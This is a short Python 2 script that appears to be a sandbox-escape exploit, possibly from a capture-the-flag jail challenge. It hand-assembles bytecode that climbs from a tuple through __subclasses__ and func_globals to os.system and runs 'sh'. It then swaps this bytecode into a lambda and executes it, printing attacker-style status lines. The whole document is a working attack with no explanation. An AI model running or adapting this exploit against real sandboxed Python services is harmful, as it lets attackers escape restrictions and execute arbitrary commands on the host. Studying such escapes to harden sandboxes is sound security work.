f = lambda : 1

type_code = type(f.func_code)

LOAD_CONST = b"\x64"
LOAD_ATTR = b"\x69"
BINARY_SUBSCR = b"\x19"
CALL_FUNCTION = b"\x83"
POP_TOP = b"\x01"
RETURN_VALUE = b"\x53"

consts = ([].append(1), 0, 59, 'sys', 'os.path', 'sh', ())
names = ('__class__', '__bases__', '__subclasses__', '__init__','func_globals', 'modules', 'os', 'system')
args = ()

fake_code = b""
fake_code += LOAD_CONST + b"\x06\x00"
fake_code += LOAD_ATTR + b"\x00\x00"
fake_code += LOAD_ATTR + b"\x01\x00"
fake_code += LOAD_CONST + b"\x01\x00"
fake_code += BINARY_SUBSCR
fake_code += LOAD_ATTR + b"\x02\x00"
fake_code += CALL_FUNCTION + b"\x00\x00"
fake_code += LOAD_CONST + b"\x02\x00"
fake_code += BINARY_SUBSCR
fake_code += LOAD_ATTR + b"\x03\x00"
fake_code += LOAD_ATTR + b"\x04\x00"
fake_code += LOAD_CONST + b"\x03\x00"
fake_code += BINARY_SUBSCR
fake_code += LOAD_ATTR + b"\x05\x00"
fake_code += LOAD_CONST + b"\x04\x00"
fake_code += BINARY_SUBSCR
fake_code += LOAD_ATTR + b"\x06\x00"
fake_code += LOAD_ATTR + b"\x07\x00"
fake_code += LOAD_CONST + b"\x05\x00"
fake_code += CALL_FUNCTION + b"\x01\x00"
fake_code += POP_TOP
fake_code += LOAD_CONST + b"\x00\x00"
fake_code += RETURN_VALUE

print("[*]fake byte code ...")
print(fake_code)

f.func_code = type_code(
    0,
    0,
    2,
    67,
    fake_code,
    consts,
    names,
    args,
    "",
    "",
    0,
    ""
)

print("[*]exec fake byte code ...")
f()
